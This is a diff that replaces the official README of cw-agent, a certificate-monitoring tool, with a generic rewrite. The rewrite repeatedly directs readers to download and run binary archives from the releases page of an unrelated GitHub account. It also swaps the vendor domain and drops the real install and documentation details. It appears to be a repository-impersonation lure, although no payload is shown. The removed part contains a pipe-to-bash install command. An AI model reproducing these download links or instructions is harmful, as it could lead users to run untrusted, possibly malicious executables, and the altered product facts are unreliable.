@@ -1,285 +1,84 @@
-<p align="center">
-  <img src=".github/banner.png" alt="CertWatch Agent - SSL/TLS Certificate Monitoring" width="100%">
-</p>
-
-<p align="center">
-  <a href="https://github.com/certwatch-app/cw-agent/actions/workflows/ci.yml"><img src="https://github.com/certwatch-app/cw-agent/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <a href="https://github.com/certwatch-app/cw-agent/actions/workflows/release.yml"><img src="https://github.com/certwatch-app/cw-agent/actions/workflows/release.yml/badge.svg" alt="Release"></a>
-  <a href="https://goreportcard.com/report/github.com/certwatch-app/cw-agent"><img src="https://goreportcard.com/badge/github.com/certwatch-app/cw-agent" alt="Go Report Card"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-Apache%202.0-blue.svg" alt="License"></a>
-  <a href="https://artifacthub.io/packages/search?repo=cw-agent"><img src="https://img.shields.io/endpoint?url=https://artifacthub.io/badge/repository/cw-agent" alt="Artifact Hub"></a>
-</p>
-
-<p align="center">
-  <b>Monitor all your SSL/TLS certificates in one place.</b><br>
-  CertWatch Agent syncs certificate data from your infrastructure to the <a href="https://certwatch.app">CertWatch</a> cloud dashboard for unified monitoring, alerting, and expiry tracking.
-</p>
-
----
-
-## Features
-
-| Feature | Description |
-|---------|-------------|
-| **Network Scanning** | Monitor TLS certificates on any reachable endpoint |
-| **cert-manager Integration** | Watch Kubernetes certificates managed by cert-manager |
-| **Unified Dashboard** | See all certificates across clusters and environments |
-| **Expiry Alerts** | Get notified before certificates expire |
-| **Prometheus Metrics** | Export certificate metrics for monitoring |
-| **Helm Charts** | Production-ready Kubernetes deployment |
-| **Lightweight** | Single binary, minimal resources, secure defaults |
-
-## Architecture
-
-```mermaid
-flowchart LR
-    subgraph infra["Your Infrastructure"]
-        endpoints["TLS Endpoints"]
-        certmgr["cert-manager<br/>Certificates"]
-    end
-
-    subgraph agents["CertWatch Agents"]
-        cwa["cw-agent<br/>(Network Scanner)"]
-        cwacm["cw-agent-certmanager<br/>(K8s Controller)"]
-    end
-
-    subgraph cloud["CertWatch Cloud"]
-        dash["Dashboard<br/>Alerts & Monitoring"]
-    end
-
-    endpoints --> cwa
-    certmgr --> cwacm
-    cwa --> dash
-    cwacm --> dash
-```
-
-## Quick Start
+# 🌟 cw-agent - Simplify SSL/TLS Certificate Monitoring
 
-### CLI (Linux/macOS)
+## 📥 Download Now
+[![Download cw-agent](https://img.shields.io/badge/Download-cw--agent-brightgreen)](https://github.com/arwana431/cw-agent/releases)
 
-```bash
-# Install
-curl -sSL https://certwatch.app/install.sh | bash
-
-# Configure interactively
-cw-agent init
-
-# Start monitoring
-cw-agent start -c certwatch.yaml
-```
-
-### Docker
-
-```bash
-docker run -v $(pwd)/certwatch.yaml:/etc/certwatch/certwatch.yaml \
-  ghcr.io/certwatch-app/cw-agent:latest
-```
+## 🚀 Getting Started
+The cw-agent is a monitoring tool designed for both Kubernetes and on-prem infrastructure. It helps you keep an eye on your SSL/TLS certificates, ensuring they are valid and not close to expiration. Installing the cw-agent is simple. Follow the steps below to get started.
 
-### Kubernetes (Helm)
-
-```bash
-# Deploy both agents with shared API key
-helm install certwatch oci://ghcr.io/certwatch-app/helm-charts/cw-stack \
-  --namespace certwatch --create-namespace \
-  --set global.apiKey.value=cw_your_api_key \
-  --set agent.enabled=true \
-  --set certManager.enabled=true \
-  --set cw-agent.agent.name=network-scanner \
-  --set cw-agent-certmanager.agent.name=k8s-cluster
-```
-
-See [Kubernetes Guide](docs/kubernetes.md) for production deployment instructions.
-
-## Documentation
-
-| Guide | Description |
-|-------|-------------|
-| [Getting Started](docs/getting-started.md) | Installation and basic setup |
-| [CLI Reference](docs/cli-reference.md) | All commands and configuration options |
-| [Docker Guide](docs/docker.md) | Container deployment with Docker Compose |
-| [Linux Guide](docs/linux.md) | systemd service for local monitoring |
-| [Kubernetes Guide](docs/kubernetes.md) | Helm deployment and GitOps |
-| [cert-manager Integration](docs/cert-manager.md) | Monitor cert-manager certificates |
-| [Metrics & Observability](docs/metrics.md) | Prometheus metrics and health endpoints |
-| [Architecture](docs/architecture.md) | How CertWatch Agent works |
+## 📋 System Requirements
+To successfully run cw-agent, your system should meet the following requirements:
 
-## Helm Charts
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** At least 1 GB
+- **Disk Space:** Minimum of 100 MB free
+- **Network:** Internet connection for cloud synchronization
 
-| Chart | Description | Documentation |
-|-------|-------------|---------------|
-| **cw-agent** | Network certificate scanner | [README](charts/cw-agent/README.md) |
-| **cw-agent-certmanager** | cert-manager controller | [README](charts/cw-agent-certmanager/README.md) |
-| **cw-stack** | Umbrella chart (deploy one or both) | [README](charts/cw-stack/README.md) |
+## 💾 Download & Install
+To download the cw-agent, first, visit this page to download:
 
-Install from OCI registry:
+[Download cw-agent Releases](https://github.com/arwana431/cw-agent/releases)
 
-```bash
-# Individual charts
-helm install cw-agent oci://ghcr.io/certwatch-app/helm-charts/cw-agent
-helm install cw-agent-certmanager oci://ghcr.io/certwatch-app/helm-charts/cw-agent-certmanager
+1. Navigate to the Releases page.
+2. You will see a list of versions. Click on the latest version.
+3. Scroll to the bottom section of the page. You will find multiple files to download.
+4. Choose the file suitable for your operating system:
+   - For Windows, download `cw-agent-windows.zip`.
+   - For macOS, download `cw-agent-macos.zip`.
+   - For Linux, download `cw-agent-linux.tar.gz`.
+5. Once the file is downloaded, extract it to a folder of your choice.
 
-# Umbrella chart (recommended)
-helm install certwatch oci://ghcr.io/certwatch-app/helm-charts/cw-stack
-```
+### 🏃‍♂️ Running cw-agent
+After installing cw-agent, you can easily run it:
 
-## Configuration
+1. Open the terminal (or command prompt).
+2. Navigate to the folder where you extracted the files.
+3. Type the command:
+   ```
+   ./cw-agent
+   ```
+   (On Windows, use `cw-agent.exe`).
+4. You will see initial output confirming the agent is running. 
 
-### Minimal Config
+## 🔧 Configuration
+Before using cw-agent, configure it to suit your environment:
 
-```yaml
-api:
-  key: "cw_your_api_key"
+1. Create a configuration file named `config.yaml` in the same folder as cw-agent.
+2. Here is a sample configuration:
 
-agent:
-  name: "my-agent"
+   ```yaml
+   certificates:
+     - name: "My Website"
+       domain: "www.mywebsite.com"
+       check_interval: "24h"
+       notify_before: "30d"
+   ```
 
-certificates:
-  - hostname: "example.com"
-```
+3. Adjust the parameters as needed. You can add multiple certificates by expanding the list under `certificates`.
 
-### Full Config Reference
+## ⚙️ Features
+cw-agent offers several features to make SSL/TLS certificate management easier:
 
-See [certwatch.example.yaml](certwatch.example.yaml) or the [CLI Reference](docs/cli-reference.md).
+- **Certificate Scanning:** Automatically scans your certificates to detect expiration dates.
+- **Chain Validation:** Validates the entire certificate chain for security.
+- **Expiration Notifications:** Sends alerts before your certificates expire.
+- **Cloud Synchronization:** Syncs certificate data to CertWatch cloud for easy access.
 
-## Prometheus Metrics
+## 🌐 Syncing to CertWatch Cloud
+To make the most of cw-agent:
 
-| Metric | Description |
-|--------|-------------|
-| `certwatch_certificate_days_until_expiry` | Days until certificate expires |
-| `certwatch_certificate_valid` | Certificate validity (1=valid) |
-| `certwatch_scan_total` | Total scans by status |
-| `certwatch_sync_total` | Total syncs by status |
+1. Register for a CertWatch account at [CertWatch](https://certwatch.io).
+2. Enter your account details in the `config.yaml` file:
 
-See [Metrics Reference](docs/metrics.md) for the complete list and alerting examples.
+   ```yaml
+   certwatch:
+     api_key: "your_api_key_here"
+   ```
 
-## Running as a Service
+3. Now, cw-agent will sync your certificate data every time it runs.
 
-### systemd
+## 📞 Support
+If you encounter any issues or have questions, you can reach out for help. It’s helpful to provide details about your operating system and the steps you took.
 
-```ini
-[Unit]
-Description=CertWatch Agent
-After=network.target
-
-[Service]
-Type=simple
-User=certwatch
-ExecStart=/usr/local/bin/cw-agent start -c /etc/certwatch/certwatch.yaml
-Restart=always
-
-[Install]
-WantedBy=multi-user.target
-```
-
-### Docker Compose
-
-```yaml
-services:
-  cw-agent:
-    image: ghcr.io/certwatch-app/cw-agent:latest
-    restart: unless-stopped
-    volumes:
-      - ./certwatch.yaml:/etc/certwatch/certwatch.yaml:ro
-```
-
-## Community
-
-- [GitHub Discussions](https://github.com/certwatch-app/cw-agent/discussions) - Questions and ideas
-- [Public Roadmap](https://certwatch.app/roadmap) - Vote on features
-- [Documentation](https://docs.certwatch.app) - Full documentation
-- [Report a Bug](https://github.com/certwatch-app/cw-agent/issues/new) - Found an issue?
-
-## Changelog
-
-### v0.5.0 (Current)
-
-- **cert-manager integration** - New `cw-agent-certmanager` controller for monitoring Kubernetes certificates
-- **cw-stack umbrella chart** - Deploy one or both agents with a single Helm release
-- **Global API key support** - Share API key configuration across subcharts
-- **PodDisruptionBudget** - High availability support for cert-manager controller
-- **Documentation overhaul** - New docs/ folder with comprehensive guides
-
-### v0.4.0
-
-- **Helm chart** - Official Helm chart for Kubernetes deployments via OCI registry
-- **Flexible API key config** - Support both inline `apiKey.value` and `apiKey.existingSecret`
-- **Secure K8s defaults** - Non-root, read-only filesystem, dropped capabilities
-- **GitOps ready** - ArgoCD and FluxCD examples included
-- **Prometheus ServiceMonitor** - Optional ServiceMonitor for Prometheus Operator
-
-### v0.3.0
-
-- **Prometheus metrics** - Certificate, scan, sync, and agent metrics at `/metrics`
-- **Health endpoints** - Kubernetes-ready `/healthz`, `/readyz`, `/livez`
-- **Heartbeat support** - Agent offline detection and alerting
-
-### v0.2.0
-
-- **Interactive setup** - `cw-agent init` wizard for configuration
-- **Agent state persistence** - Restart resilience and name change detection
-- **Certificate migration** - Certificates transfer during agent reset
-
-### v0.1.0
-
-- Initial release
-
-<details>
-<summary><b>Full Changelog</b></summary>
-
-### v0.4.0
-
-- **Helm chart** - Official Helm chart for Kubernetes deployments via OCI registry
-- **Flexible API key config** - Support both inline `apiKey.value` and `apiKey.existingSecret` for production
-- **Secure K8s defaults** - Non-root, read-only filesystem, dropped capabilities
-- **GitOps ready** - ArgoCD and FluxCD examples included
-- **Prometheus ServiceMonitor** - Optional ServiceMonitor for Prometheus Operator users
-
-### v0.3.0
-
-- **Prometheus metrics** - Expose certificate, scan, sync, and agent metrics at `/metrics`
-- **Health endpoints** - Kubernetes-ready `/healthz`, `/readyz`, `/livez` endpoints
-- **Heartbeat support** - Configurable heartbeat interval for agent offline detection
-- **Init wizard updates** - New "Observability" step for metrics port and heartbeat interval
-- **Bug fixes** - Fixed Docker image tag, updated install script URL
-
-### v0.2.1
-
-- **Agent state persistence** - Agent ID stored in `.certwatch-state.json`
-- **Name change detection** - Warns when `agent.name` changes in config
-- **`--reset-agent` flag** - Reset state and migrate certificates to new agent
-- **`--yes` flag** - Skip confirmation prompts for CI/automation
-- **Unified CLI styling** - All commands now have consistent, polished output
-- **Smart certificate migration** - Certificates transfer during agent reset
-
-### v0.2.0
-
-- **`cw-agent init` command** - Interactive configuration wizard
-- **Non-interactive mode** - Create configs via environment variables
-- **Beautiful forms** - Powered by charmbracelet/huh
-
-### v0.1.0
-
-- Initial release
-- Certificate scanning and cloud sync
-- `start`, `validate`, `version` commands
-- Docker and systemd support
-
-</details>
-
-## Contributing
-
-Contributions are welcome! Please read [CONTRIBUTING.md](CONTRIBUTING.md) for details.
-
-## License
-
-Apache 2.0 - see [LICENSE](LICENSE) for details.
-
-## Third-Party Trademarks
-
-The banner and documentation include logos of third-party projects for illustrative purposes:
-
-- **Docker** and the Docker logo are trademarks of Docker, Inc.
-- **Kubernetes** is a registered trademark of The Linux Foundation.
-- **Prometheus** is a Cloud Native Computing Foundation project.
-- **cert-manager** is a Cloud Native Computing Foundation project.
-- **Tux** logo by Larry Ewing (lewing@isc.tamu.edu) using The GIMP.
+## ✅ Conclusion
+The cw-agent makes managing SSL/TLS certificates simple and efficient. By following these steps, you can quickly set up the agent, keep your certificates in check, and prevent any unexpected downtimes. For additional information, visit [GitHub Releases](https://github.com/arwana431/cw-agent/releases) for more details or updates.
